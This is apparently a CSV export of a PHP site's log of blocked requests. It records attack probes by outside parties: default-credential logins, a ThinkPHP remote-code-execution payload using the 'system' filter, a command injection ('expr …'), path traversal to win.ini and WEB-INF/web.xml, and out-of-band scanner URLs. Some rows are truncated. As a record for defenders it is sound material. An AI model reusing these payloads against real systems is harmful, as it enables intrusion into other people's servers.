293,NULL,NULL,/,"{\""post\"":{\""action\"":\""login\""","\""username\"":\""admin\""","\""password\"":\""[DELETED]\""}}",NULL,1,2025-01-24 06:17:59,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
294,NULL,NULL,/?wicket:interface=:0:userPanel:loginForm::IFormSubmitListener::,"{\""post\"":{\""wicket:bookmarkablePage\"":\"":com.gitblit.wicket.pages.MyDashboardPage\""","\""id1_hf_0\"":\""\""","\""username\"":\""admin\""","\""password\"":\""[DELETED]\""}","\""get\"":{\""wicket:interface\"":\"":0:userPanel:loginForm::IFormSubmitListener::\""}}",NULL,1,2025-01-24 06:20:43,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
295,NULL,NULL,/?wicket:interface=:0:userPanel:loginForm::IFormSubmitListener::,"{\""post\"":{\""wicket:bookmarkablePage\"":\"":com.gitblit.wicket.pages.MyDashboardPage\""","\""id1_hf_0\"":\""\""","\""username\"":\""admin\""","\""password\"":\""[DELETED]\""}","\""get\"":{\""wicket:interface\"":\"":0:userPanel:loginForm::IFormSubmitListener::\""}}",NULL,1,2025-01-24 06:20:43,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
296,NULL,NULL,/?wicket:interface=:0:userPanel:loginForm::IFormSubmitListener::,"{\""post\"":{\""wicket:bookmarkablePage\"":\"":com.gitblit.wicket.pages.MyDashboardPage\""","\""id1_hf_0\"":\""\""","\""username\"":\""admin\""","\""password\"":\""[DELETED]\""}","\""get\"":{\""wicket:interface\"":\"":0:userPanel:loginForm::IFormSubmitListener::\""}}",NULL,1,2025-01-24 06:20:44,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
297,NULL,NULL,/?wicket:interface=:0:userPanel:loginForm::IFormSubmitListener::,"{\""post\"":{\""wicket:bookmarkablePage\"":\"":com.gitblit.wicket.pages.MyDashboardPage\""","\""id1_hf_0\"":\""\""","\""username\"":\""admin\""","\""password\"":\""[DELETED]\""}","\""get\"":{\""wicket:interface\"":\"":0:userPanel:loginForm::IFormSubmitListener::\""}}",NULL,1,2025-01-24 06:20:44,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
298,NULL,NULL,/,"{\""post\"":{\""cmd\"":\""login\""","\""user\"":\""admin\""","\""passwd\"":\""21232f297a57a5a743894a0e4a801fc3\""}}",NULL,1,2025-01-24 06:25:17,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
299,NULL,NULL,/,"{\""post\"":{\""cmd\"":\""login\""","\""user\"":\""admin\""","\""passwd\"":\""21232f297a57a5a743894a0e4a801fc3\""}}",NULL,1,2025-01-24 06:25:19,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
300,NULL,NULL,/,"{\""post\"":{\""cmd\"":\""login\""","\""user\"":\""admin\""","\""passwd\"":\""21232f297a57a5a743894a0e4a801fc3\""}}",NULL,1,2025-01-24 06:25:20,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
301,NULL,NULL,/,"{\""post\"":{\""cmd\"":\""login\""","\""user\"":\""admin\""","\""passwd\"":\""21232f297a57a5a743894a0e4a801fc3\""}}",NULL,1,2025-01-24 06:25:20,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
302,NULL,NULL,/,"{\""post\"":{\""fm_usr\"":\""admin\""","\""fm_pwd\"":\""admin@123\""","\""token\"":\""45f5eaefea858e20d125cf18b4868f775f8217ec16a955b9e185995621aced61\""}}",NULL,1,2025-01-24 06:25:43,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
303,NULL,NULL,/,"{\""post\"":{\""fm_usr\"":\""admin\""","\""fm_pwd\"":\""admin@123\""","\""token\"":\""9cdc0eef18670bb4772317743282f2d8736a531d98dab8a077923f6ecea4f3fa\""}}",NULL,1,2025-01-24 06:25:43,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
304,NULL,NULL,/,"{\""post\"":{\""fm_usr\"":\""admin\""","\""fm_pwd\"":\""admin@123\""","\""token\"":\""f333947cfa83c1a51462736006bd80a70dd55cdadca18435d4150a282dbc75a8\""}}",NULL,1,2025-01-24 06:25:46,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
305,NULL,NULL,/,"{\""post\"":{\""fm_usr\"":\""admin\""","\""fm_pwd\"":\""admin@123\""","\""token\"":\""8f6927fca1301fb6e0251b45000c1537f06975f47d0275f0171eec0663ddc87b\""}}",NULL,1,2025-01-24 06:25:46,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,,
306,NULL,NULL,/?s=index/index/index,"{\""post\"":{\""s\"":\""echo thinkphp | rev\""","\""_method\"":\""__construct\""","\""method\"":\""\""","\""filter\"":[\""system\""]}","\""get\"":{\""s\"":\""index\\/index\\/index\""}}",NULL,1,2025-01-24 06:45:06,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
307,NULL,NULL,/?s=index/index/index,"{\""post\"":{\""s\"":\""echo thinkphp | rev\""","\""_method\"":\""__construct\""","\""method\"":\""\""","\""filter\"":[\""system\""]}","\""get\"":{\""s\"":\""index\\/index\\/index\""}}",NULL,1,2025-01-24 06:45:06,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
308,NULL,NULL,/?s=index/index/index,"{\""post\"":{\""s\"":\""echo thinkphp | rev\""","\""_method\"":\""__construct\""","\""method\"":\""\""","\""filter\"":[\""system\""]}","\""get\"":{\""s\"":\""index\\/index\\/index\""}}",NULL,1,2025-01-24 06:45:07,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
309,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""f18d815c5bb4124fa0e2c3aff857cc2cf818f4dff2ef7d77e93da8fd328999e1\""","\""login\"":\""\""","\""password\"":\""\""","\""captcha_code\"":\""e9dd3a24\""","\""sign-in\"":\""true\""}}",NULL,1,2025-01-24 11:20:35,2025-01-25 11:14:59,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
433,NULL,NULL,/reg?XMR,"{\""post\"":{\""c\"":\""7c92f67b\""}","\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 01:55:41,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,
434,NULL,NULL,/reg?XMR,"{\""post\"":{\""c\"":\""672b2735\""}","\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 02:06:42,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,
435,NULL,NULL,/reg?XMR,"{\""post\"":{\""c\"":\""8e6e05b8\""}","\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 02:10:54,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,
436,NULL,NULL,/reg?XMR,"{\""post\"":{\""c\"":\""a9dbbb57\""}","\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 02:12:17,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,
437,NULL,NULL,/reg?XMR,"{\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 02:23:03,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,,
438,NULL,NULL,/reg?XMR,"{\""post\"":{\""c\"":\""5faa92bc\""}","\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 03:24:06,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,
439,NULL,NULL,/reg?XMR,"{\""post\"":{\""c\"":\""5f56d551\""}","\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 08:27:48,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,
440,NULL,NULL,/reg?XMR,"{\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 17:20:23,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,,
441,NULL,NULL,/reg?XMR,"{\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 17:20:45,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,,
442,NULL,NULL,/reg?XMR,"{\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 17:21:10,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,,
443,NULL,NULL,/reg?XMR,"{\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 17:22:10,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,,
444,NULL,NULL,/reg?XMR,"{\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 17:22:31,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,,
445,NULL,NULL,/reg?XMR,"{\""post\"":{\""c\"":\""d0a780ef\""}","\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 17:33:15,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,
446,NULL,NULL,/reg?XMR,"{\""post\"":{\""c\"":\""5658c0b4\""}","\""get\"":{\""XMR\"":\""\""}}",NULL,1,2025-03-19 22:02:16,2025-03-21 19:43:16,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,
559,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""0c775826ead3e2f2a61fc483810c0482639fff5955a7ed6a9c6a979c3f5a202e\""","\""login\"":\""\""","\""password\"":\""\""","\""captcha_code\"":\""f0c8a017\""","\""sign-in\"":\""true\""}}",NULL,1,2025-04-15 21:04:10,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
560,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""ef14312823aff2916005e6cc08ad7880e4dd417a58e093953be3c5866cee1ece\""","\""login\"":\""checksum\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""5ec32aec\""","\""sign-in\"":\""true\""}}",NULL,1,2025-04-16 07:37:03,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
561,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""f386cc14fe2e58a8cb27ce79913c4745068c619867a6e6481345ec6decc0c5d4\""","\""login\"":\""checksum\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""06dba358\""","\""sign-in\"":\""true\""}}",NULL,1,2025-04-16 07:37:19,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
562,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""74ae811310bfdf2aadad18e4260631a85e7b00d6c839fdc2d290aa642606d6f1\""","\""login\"":\""checksum\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""07bc46f8\""","\""sign-in\"":\""true\""}}",NULL,1,2025-04-16 07:38:09,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
563,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""36b9f5015cf33d0215154b57b8c08bf6aa09b7764edb37b548942db34dc72a7c\""","\""login\"":\""checksum\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""47e23001\""","\""sign-in\"":\""true\""}}",NULL,1,2025-04-16 07:44:38,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
564,NULL,NULL,/reg,"{\""post\"":{\""c\"":\""508d852b\""}}",NULL,1,2025-04-17 02:13:51,NULL,,/home/www/backend/backend/routes/reg.php,93,,,,,,,,,
565,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""78088d00a6ac77659b5ec48b8d190a13cf2ed03e66ba881047253b12b1dabd58\""","\""login\"":\""\""","\""password\"":\""\""","\""captcha_code\"":\""fc322b41\""","\""sign-in\"":\""true\""}}",NULL,1,2025-04-17 02:17:09,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,
687,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""Http:\\/\\/bxss.me\\/t\\/fit.txt\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:31,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
688,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""!((",,,,,,,,,,,,,,,
689,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""WEB-INF\\\\web.xml\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:32,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
690,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""http:\\/\\/bxss.me\\/t\\/fit.txt%3F.jpg\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:32,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
691,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""^(#$!@#$",,,,,,,,,,,,,,,
(,,,,,,,,,,,,,,,,,,,,
692,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:33,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
693,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:34,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
694,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:35,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
695,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:36,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
696,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:36,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
697,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""",,,,,,,,,,,,,
698,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:37,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
699,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\"".\\/aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:38,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
700,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""!((",,,,,,,,,,,,,
701,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:38,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
702,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""^(#$!@#$",,,,,,,,,,,,,
(,,,,,,,,,,,,,,,,,,,,
703,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:39,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
704,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""\'\\\""(",,,,,,,,,,,,,,,,
705,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:40,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
706,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""http:\\/\\/dicrpdbjmemujemfyopp.zzz\\/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg\""}}",NULL,1,2025-04-24 00:43:41,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
707,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""expr 9000632058 - 981950\""}}",NULL,1,2025-04-24 00:43:42,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
708,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""\'\\\""(",,,,,,,,,,,,,,,
709,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""c:\\/windows\\/win.ini\""}}",NULL,1,2025-04-24 00:43:44,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
710,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""bxss.me\""}}",NULL,1,2025-04-24 00:43:46,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
711,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""Http:\\/\\/bxss.me\\/t\\/fit.txt\""}}",NULL,1,2025-04-24 00:43:47,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
712,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""http:\\/\\/bxss.me\\/t\\/fit.txt%3F.jpg\""}}",NULL,1,2025-04-24 00:43:48,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
713,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""redirtest.acx\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:50,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
714,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:50,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
715,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""redirtest.acx\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:51,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
716,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:52,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
717,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""redirtest.acx\""}}",NULL,1,2025-04-24 00:43:53,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
718,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""\\/WEB-INF\\/web.xml\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:43:54,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
719,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""\'\\\""(",,,,,,,,,,,,,
720,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""WEB-INF\\/web.xml\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:04,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
721,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""WEB-INF\\\\web.xml\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:05,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
722,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""",,,,,,,,,,,,,,,,
723,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:09,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
724,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""",,,,,,,,,,,,,,,
725,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:10,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
726,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:12,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
727,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""",,,,,,,,,,,,,
728,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""xfs.bxss.me\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:13,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
729,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""xfs.bxss.me\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:14,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
730,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:15,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
731,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""7ceaf66968d333f20a1a369ff389a537e9db32518b1cfe3a8757ebec48b2bd9a\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""xfs.bxss.me\""}}",NULL,1,2025-04-24 00:44:16,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
732,NULL,NULL,/,"{\""post\"":{\""csrf\"":\""\'\\\""\""","\""login\"":\""aYlNlfdX\""","\""password\"":\""[DELETED]\""","\""captcha_code\"":\""94102\""}}",NULL,1,2025-04-24 00:44:17,NULL,Invalid CSRF,/home/www/backend/functions.php,120,,,,,,
